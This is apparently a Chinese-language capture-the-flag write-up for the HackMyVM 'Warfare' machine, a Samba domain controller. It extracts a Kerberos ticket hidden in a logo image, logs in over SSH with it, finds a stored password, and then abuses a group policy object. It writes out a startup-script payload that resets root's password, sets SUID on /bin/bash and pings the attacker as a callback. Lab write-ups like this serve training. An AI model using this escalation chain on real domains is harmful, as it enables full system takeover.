![image-20251112185313880](http://7r1UMPHK.github.io/image/20251113132932223.webp)

> **靶机地址**: https://hackmyvm.eu/machines/machine.php?vm=Warfare
>
> **难度**: ~~简单~~（困难）
>
> **作者**: tasiyanci

## 一、信息收集

### 1.1 主机发现

使用 `arp-scan` 对目标网段进行扫描，以发现存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.135 00:0c:29:24:e9:11       VMware, Inc.
...
```

根据扫描结果，确定目标主机的 IP 地址为 `192.168.205.135`。

### 1.2 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 18:55 CST
Nmap scan report for hacker.maze-sec.hmv (192.168.205.135)
Host is up (0.000080s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
...
```

扫描结果显示开放了大量与 Active Directory 相关的端口（如 88, 139, 389, 445 等），表明这可能是一台域控制器，但运行在 Linux 系统上（开放了 SSH 22 端口），推测是使用 Samba 搭建的域控。

## 二、漏洞发现与初始访问

### 2.1 Web 服务枚举与图片隐写

访问 `http://192.168.205.135`，发现一个静态页面。对网站目录进行扫描，未发现可利用的漏洞。

![image-20251112185616900](C:\Users\ABCDEFG888\AppData\Roaming\Typora\typora-user-images\image-20251112185616900.png)

注意到 `/assets/logo.png` 的修改时间非常新。将该图片下载，并与网站提到的 [官方 Github 仓库](https://github.com/armctf/) 中的原版图片进行比较。

```bash
# 下载靶机上的图片
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wget http://192.168.205.135/assets/logo.png -O logo_target.png

# 下载原版图片
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wget https://raw.githubusercontent.com/armctf/armctf/refs/heads/main/assets/logo.png -O logo_original.png

# 比较文件大小和内容
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ls -la *.png
-rwxr-xr-x 1 kali kali 216884 11月12日 19:03 logo_original.png
-rwxr-xr-x 1 kali kali 221921 11月12日 19:00 logo_target.png

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cmp logo_target.png logo_original.png
logo_target.png logo_original.png 不同：第 36 字节（第 3 行）
```

两张图片大小和内容均不一致，高度怀疑 `logo_target.png` 中隐藏了信息。使用 `steg-png` 工具进行提取。

```bash
# 编译安装 steg-png
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ git clone https://github.com/brandon1024/steg-png.git && cd steg-png

# 根据提示修复编译依赖后进行编译安装
└─$ mkdir build && find /mnt/hgfs/gx/x/tmp/steg-png/src -name "*.c" -exec sed -i '1i #define _XOPEN_SOURCE 700\n#define _DEFAULT_SOURCE\n' {} \; && cd /mnt/hgfs/gx/x/tmp/steg-png/build && cmake -DCMAKE_INSTALL_PREFIX=/usr/local .. && sudo make install  

# 提取隐藏数据
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ steg-png extract -o ticket logo_target.png
```

使用 `strings` 命令查看提取出的文件 `ticket`，发现其中包含 `WARFARE.LOCAL`、`robert`、`krbtgt` 等字符串，确认为一张 Kerberos 票据。

### 2.2 Kerberos 票据利用

获得了用户 `robert` 的 Kerberos 票据，可以尝试利用该票据进行认证。

1.  **配置 hosts 文件**：将域名和 IP 添加到 `/etc/hosts` 中。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ echo "192.168.205.135 warfaredc.warfare.local WARFARE.LOCAL" | sudo tee -a /etc/hosts
    ```

2.  **导入票据**：设置环境变量 `KRB5CCNAME` 指向提取出的票据文件。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ export KRB5CCNAME=/mnt/hgfs/gx/x/ticket
    ```

3.  **查看票据并登录**：使用 `klist` 查看票据信息，然后使用 SSH GSSAPI 进行认证登录。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ klist
    Ticket cache: FILE:/mnt/hgfs/gx/x/ticket
    Default principal: robert@WARFARE.LOCAL
    
    Valid starting       Expires              Service principal
    2025-11-12T19:00:30  2025-11-13T05:00:30  krbtgt/WARFARE.LOCAL@WARFARE.LOCAL
    ...
    
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes robert@warfaredc.warfare.local
    ...
    WARFARE\robert@warfaredc:~$ id
    uid=10001(WARFARE\robert) gid=100(users) groups=100(users),3000009(BUILTIN\users)
    ```
    成功获取 `robert` 用户的 shell。

## 三、权限提升

### 3.1 域内信息收集

登录后，在 `robert` 的家目录下发现 `damn.txt` 文件，其中记录了该用户的密码 `.:.crossroadSBlues!`。同时可以读取 `user.txt` 获取第一个 flag。

```bash
WARFARE\robert@warfaredc:~$ cat user.txt
9e80f8f7698272b854e7d0480267b7e6

WARFARE\robert@warfaredc:~$ cat damn.txt
in case of anything, i note my password here.

.:.crossroadSBlues!
```

使用 `rusthound`（BloodHound 的采集器）对域内信息进行收集，为后续提权寻找路径。

```bash
WARFARE\robert@warfaredc:/tmp$ ./rusthound -d warfare.local --ldapusername robert --ldappassword '.:.crossroadSBlues!' -z
...
[INFO] rusthound::json::maker] .//20251112064005_warfare-local_rusthound.zip created!
```

将生成的 `zip` 文件传回本地，导入 BloodHound 进行分析。

### 3.2 GPO 滥用提权至 Root

![image-20251112195903620](http://7r1UMPHK.github.io/image/20251113132934268.webp)

BloodHound 的分析结果显示，用户 `robert@WARFARE.LOCAL` 对名为 `ENDPOINTSETTINGS@WARFARE.LOCAL` 的 GPO（组策略对象）拥有 `GenericAll` 的完全控制权限。这意味着 `robert` 可以修改这个 GPO。

由于该靶机是基于 Samba 的 AD DC，常规的 `pyGPOAbuse` 工具无法使用。这里需要使用作者针对 Samba 环境修改的[特定分支](https://github.com/crosscutsaw/pyGPOAbuse_samba_ad_dc)。

1.  **创建恶意脚本**：创建一个反弹 shell 或其他提权脚本。这里我们创建一个脚本 `rev.sh`，用于修改 `root` 密码并为 `/bin/bash` 添加 SUID 权限，并通过 `ping` 命令确认脚本是否执行。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ cat > rev.sh <<EOL
    #!/bin/bash
    echo "root:YourNewPassword123" | chpasswd
    chmod +s /bin/bash
    ping -c2 192.168.205.128
    EOL
    ```

2.  **查找 GPO 的 GUID**：使用 `ldapsearch` 查询 `endpointsettings` GPO 对应的 CN（GUID）。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ ldapsearch -x -H ldap://192.168.205.135 -D "robert@warfare.local" -w '.:.crossroadSBlues!' -b "CN=Policies,CN=System,DC=warfare,DC=local" "(displayName=endpointsettings)" cn
    ...
    dn: CN={6BB6659D-BFAD-44B1-8B36-066C35CE2931},CN=Policies,CN=System,DC=warfare,DC=local
    cn: {6BB6659D-BFAD-44B1-8B36-066C35CE2931}
    ```
    得到 GUID 为 `{6BB6659D-BFAD-44B1-8B36-066C35CE2931}`。

3.  **执行 GPO 攻击**：使用 `pygpoabuse.py` 脚本将 `rev.sh` 作为启动脚本添加到目标 GPO 中。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/pyGPOAbuse_samba_ad_dc]
    └─$ python3 pygpoabuse.py 'warfare.local/robert':'.:.crossroadSBlues!' -dc-ip 192.168.205.135 -gpo-id '{6BB6659D-BFAD-44B1-8B36-066C35CE2931}' --linux-exec rev.sh
    [+] SUCCESS:root:executable 'rev.sh' created in warfare.local\Policies\{...}\MACHINE\VGP\VTLA\Unix\Scripts\Startup
    ```

4.  **等待并确认执行**：等待域策略刷新（通常为几分钟）。在本地使用 `tcpdump` 监听 ICMP 请求，如果收到来自靶机的 `ping`，则说明脚本已成功以 `root` 权限执行。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ sudo tcpdump -n icmp
    ...
    20:40:01.830139 IP 192.168.205.135 > 192.168.205.128: ICMP echo request...
    ```

5.  **获取 Root Shell**：回到 `robert` 的 shell，检查 `/bin/bash` 的权限，发现已设置 SUID 位。执行 `bash -p` 以保留 euid，成功获得 root 权限。
    ```bash
    WARFARE\robert@warfaredc:/tmp$ ls -al /bin/bash
    -rwsr-sr-x 1 root root 1298416 Jul 30 15:28 /bin/bash
    WARFARE\robert@warfaredc:/tmp$ bash -p
    bash-5.2# id
    uid=10001(WARFARE\robert) gid=100(users) euid=0(root) egid=0(root) groups=0(root),100(users),...
    ```

## 四、夺取 Flag

成功提权至 root 后，读取最终的 flag。

```bash
bash-5.2# cat /root/root.txt
802ecda85157bb5e02f815b97799bbd5
```

渗透测试完成。